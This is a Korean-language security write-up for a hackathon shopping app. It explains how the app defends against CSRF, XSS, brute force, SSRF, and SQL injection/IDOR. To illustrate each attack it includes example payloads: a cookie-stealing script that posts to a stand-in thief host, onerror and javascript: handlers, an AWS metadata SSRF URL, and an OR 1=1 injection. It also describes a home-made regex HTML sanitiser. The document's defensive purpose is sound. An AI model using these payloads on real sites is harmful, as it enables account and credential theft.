CSRF — 위조 요청 차단
A01:2021 Broken Access Control A08 Software Integrity
한 줄"내가 한 적 없는데 내 계정으로 행해진 요청" 을 막는 기술. 사용자 모르게 그 사람 권한으로 요청을 보내는 공격을 차단.
왜 생김브라우저는 어떤 사이트로 요청을 보내든 그 사이트에 저장된 쿠키(로그인 세션 포함)를 자동으로 같이 전송해. 그래서 사용자가 우리 사이트에 로그인한 상태에서 다른 사이트(악성)를 열면, 그 악성 사이트에서 우리 사이트로 요청 보내도 쿠키가 자동으로 같이 가서 서버 입장에선 진짜 사용자 요청과 구분 안 됨.
공격 시나리오 1. 사용자가 장터한상에 로그인 (쿠키에 세션 저장됨)
2. 다른 탭에서 악성 블로그 클릭
3. 악성 페이지에 숨겨진 코드: <img src="https://sogra-hackathon.vercel.app/api/orders?items=상품X1000">
4. 브라우저가 이미지인 줄 알고 요청 전송 + 쿠키 자동 동봉
5. 서버는 "로그인된 사용자가 주문함"으로 처리 → 사용자 모르게 1000개 결제됨
왜 쿠키만으론 못 막나쿠키는 어차피 같은 도메인으로 가는 모든 요청에 자동 동봉됨. 서버는 "이 요청이 우리 사이트 폼에서 왔는지 / 외부에서 왔는지" 구분할 방법이 없음. → "쿠키 + 추가 증거" 가 필요.
우리 방어 Double-Submit Cookie: 우리만 만들 수 있는 랜덤 토큰을 발급해서 쿠키 + HTTP 헤더 양쪽에 똑같이 보내게 함. 서버는 쿠키 값 ≡ 헤더 값 같으면 통과.

왜 동작? 악성 사이트는 우리 사이트의 쿠키를 JavaScript로 읽을 수 없음 (Same-Origin Policy). 쿠키 자동 동봉은 되지만 그 값을 헤더에 똑같이 넣을 방법이 없음 → 토큰 불일치 → 403 차단.
동작 단계 ① 사용자 접속 → middleware가 랜덤 32바이트 토큰 생성 →
   Set-Cookie: sogra_csrf=ab12...cd

② 사용자 폼 제출 → 클라이언트 JS가 cookie 값 읽음 →
   fetch("/api/orders", { headers: { "x-csrf-token": "ab12...cd" } })

③ 서버 verifyCsrf(req):
   cookie.sogra_csrf === header["x-csrf-token"] ? OK : 403
추가 보호 • Constant-time 비교: 토큰을 char별로 비교할 때 일치/불일치까지 걸리는 시간 차이를 노리는 timing attack 방어
• 32바이트 = 64 hex chars: 무작위 추측 사실상 불가 (2^256)
코드 위치
lib/security/csrf.ts — generateToken / verifyCsrf / ensureCsrfCookie middleware.ts:7 — 모든 요청에 sogra_csrf 쿠키 자동 발급 lib/csrf-client.ts — 클라이언트 fetch wrapper (헤더 자동 부착) app/api/auth/login, signup, /api/products, /api/orders, /api/reviews, /api/upload — 모든 POST 진입에서 verifyCsrf

XSS — 스크립트 주입 차단
Cross-Site Scripting A03 Injection
한 줄"사용자 입력에 숨겨진 코드가 다른 사람 브라우저에서 실행되는" 공격. 결과: 쿠키·세션·개인정보 탈취, 가짜 페이지 띄우기, 자동 송금까지.
왜 생김웹페이지는 HTML로 그려지는데, HTML 안에 <script> 태그가 있으면 브라우저가 그냥 그 코드를 실행해. 그래서 사용자가 입력한 문자열을 그대로 페이지에 박으면, 그 안에 <script> 가 있을 경우 다음 방문자가 그 페이지 열 때 자동으로 실행됨.
3가지 종류 ① Stored XSS (가장 위험) — DB에 저장된 악성 코드 (예: 리뷰·게시글). 모든 방문자가 영향받음.
② Reflected XSS — URL 파라미터로 즉시 반사 (예: /search?q=<script>...). 링크 클릭 유도형.
③ DOM XSS — 클라이언트 JS가 innerHTML로 사용자 입력 직접 박을 때.
공격 시나리오 1. 악성 사용자가 어떤 상품 리뷰에 다음을 작성:
   <script>fetch('https://도둑.com/steal', { method:'POST', body: document.cookie })</script>

2. 옛날 시스템이면 그대로 DB에 저장 → 그대로 페이지에 박힘
3. 다른 방문자가 그 상품 페이지 열면 → 브라우저가 <script> 자동 실행
4. 방문자의 세션 쿠키가 도둑 서버로 전송
5. 도둑이 그 쿠키로 그 사람 계정 로그인 → 계정 탈취 완료
이벤트 핸들러로도 가능 <script> 없이도 위험:
  <img src="x" onerror="alert(document.cookie)">
이미지가 안 보이니까 onerror 핸들러가 실행 → 코드 실행.
같은 식으로 onclick, onmouseover, onload 등 모두 위험.
javascript: 스킴 링크 hrefs도 위험: <a href="javascript:alert(1)">클릭</a>
사용자가 클릭하면 JS 실행.
우리 방어 — 2단계 ① 입력 시점 (서버) — sanitizeHtml() / stripHtml()
DB에 저장하기 전에 위험 요소 제거:
  • <script>, <iframe>, <style>, <form>, <link>, <meta> 태그 통째로 삭제
  • 모든 on* 이벤트 핸들러 (onclick, onerror, …) 제거
  • javascript: 스킴 제거
  • 허용 태그(<b>, <i>, <p>, <br>)는 유지

② 출력 시점 (React) — 기본 escape
React가 {value}로 렌더하면 자동으로 <를 &lt;로 escape → 텍스트로만 보임. 위험한 건 dangerouslySetInnerHTML 쓸 때만이라 그 자리에서 한 번 더 sanitize.
동작 단계 ① 사용자: POST /api/reviews body: { content: "<script>xxx()</script>정성스러운 후기" }

② 서버 sanitizeHtml(content):
   정규식 매칭으로 <script>...</script> 통째 삭제
   결과: "정성스러운 후기"

③ DB.insert(reviews, { content: "정성스러운 후기" })

④ 다른 방문자: GET /product/[id]
   React: <p>{review.content}</p> → "정성스러운 후기" 텍스트로만 표시
방식regex 자체 구현 (Vercel Fluid Compute에서 jsdom/DOMPurify가 ESM 충돌로 깨져서 자체 작성)
코드 위치
lib/security/sanitize.ts — sanitizeHtml (허용태그 유지) / stripHtml (전체 태그 제거) /api/auth/login:26 — email stripHtml /api/auth/signup:31 — displayName stripHtml /api/recommend:54-56 — target/occasion/preference (Gemini 프롬프트 인젝션 완화) /api/products:109,114 — name stripHtml + description sanitizeHtml /api/reviews — 리뷰 본문 sanitize app/product/[id]/page.tsx — dangerouslySetInnerHTML 직전 sanitize 추가

BruteForce 잠금 — 비번 무차별 대입 차단
Credential Stuffing A07 Auth Failures
비유핸드폰 비번 5번 틀리면 "잠시 잠금". 도둑이 1234부터 9999까지 다 시도해도 못 들어감.

SSRF 방어 — 내부망 스캔 차단
Server-Side Request Forgery A10 SSRF
한 줄사용자가 입력한 URL을 우리 서버가 fetch하다가 "내부망 / 사설IP / 클라우드 메타데이터"를 노출하는 공격 차단.
공격셀러가 이미지 URL 입력란에 https://169.254.169.254/latest/meta-data/iam/security-credentials/ 입력 → 우리 서버가 그걸 fetch → AWS IAM 토큰 응답으로 받음 → 그 토큰이 어딘가에 노출되면 → 클라우드 전체 장악.
우리 방어 — 7단계 검증 ① 프로토콜: https: 만 허용 → file:, ftp:, data:, javascript:, blob: 차단
② Credential URL: https://user:pass@host 형식 차단
③ Hostname 패턴: localhost, *.local, *.internal 차단
④ 리터럴 IP 차단 대역:
  IPv4 — 10/8, 172.16/12, 192.168/16, 127/8 (loopback), 0/8, 169.254/16 (AWS metadata), 100.64/10 (CGNAT), 224+ (멀티캐스트)
  IPv6 — ::1, fc00/7 (ULA), fe80 (link-local), ff00 (멀티캐스트), ::ffff: (IPv4-mapped)
⑤ 화이트리스트: ALLOWED_IMAGE_HOSTS env + 서브도메인 매칭
⑥ DNS Rebinding 방어: hostname → DNS 해석 → A/AAAA 결과가 사설 IP면 차단
⑦ 리다이렉트 hop 검증: 301/302 따라갈 때마다 매 hop 재검증 (최대 5회)
DNS Rebinding 이란 악성사이트가 attacker.com 도메인 등록 → DNS TTL 매우 짧게 → 첫 응답은 정상 IP, 두 번째 응답은 169.254.169.254 같은 내부 IP. 우리 서버가 hostname 검증만 하면 통과 → 두 번째 DNS 조회 때 내부 IP로 fetch → 침해.

→ isUrlSafeWithDns() 가 DNS 해석 결과 자체를 검증해서 우회 차단.
리다이렉트 공격 공격자: https://innocent.com/redirect 등록 → 그 URL이 302로 169.254.169.254 응답. 첫 URL 검증만 하면 통과되고 fetch가 리다이렉트 따라가서 침해.

→ fetchWithRedirectGuard() 가 redirect:"manual"로 hop 받아서 매번 다시 검증.
방식자동 매핑(Naver/Pexels)은 신뢰된 내부 호출이라 SSRF 체크 우회. 사용자 입력 URL만 isUrlSafe().
코드 위치
lib/security/ssrf.ts — isUrlSafe (동기) / isUrlSafeWithDns (DNS) / fetchWithRedirectGuard (리다이렉트) /api/products:59-67 — 사용자 입력 image_url 검사 (isUrlSafe) env: ALLOWED_IMAGE_HOSTS — images.unsplash.com, cdn.pixabay.com, picsum.photos, supabase.co, images.pexels.com

파일 업로드 검증 — 위장 파일 차단

RLS + SQLi 방어 — DB 직접 침입 차단
SQL Injection · IDOR A01 + A03
비유은행 금고 두 겹 잠금. 자물쇠1: 마법 주문(SQL 인젝션) 글자로 처리. 자물쇠2: 내 통장은 나만 볼 수 있게 DB가 자동 검증.
공격로그인 폼에 email: admin' OR 1=1 -- 입력 → 옛날 시스템이면 SQL이 SELECT * FROM users WHERE email='admin' OR 1=1 --'로 실행돼서 모든 계정 통과. + 주문 상세 URL의 ID만 바꿔서 다른 사람 주문 훔쳐보기 (IDOR).
우리2겹 방어: ① Supabase ORM이 모든 입력을 Prepared Statement로 처리 → 마법 주문이 그냥 글자로 됨. ② RLS 정책: orders 테이블 select 시 자동으로 buyer_id = auth.uid() 조건 강제. 다른 사람 주문은 DB에서 안 보임.
코드 위치
supabase/migrations/0001_init.sql — 모든 테이블 RLS enable + 정책 supabase/migrations/0002_fix_rls_recursion.sql — is_admin() helper /api/products:22-26 — SQLi 데모 (' OR 1=1 --도 안전)
RLS 정책 예 • products: is_approved=true OR 본인 가게 OR admin
• orders: buyer_id = auth.uid() (본인만)
• reviews: read public, write 본인만
• login_attempts: service-role only
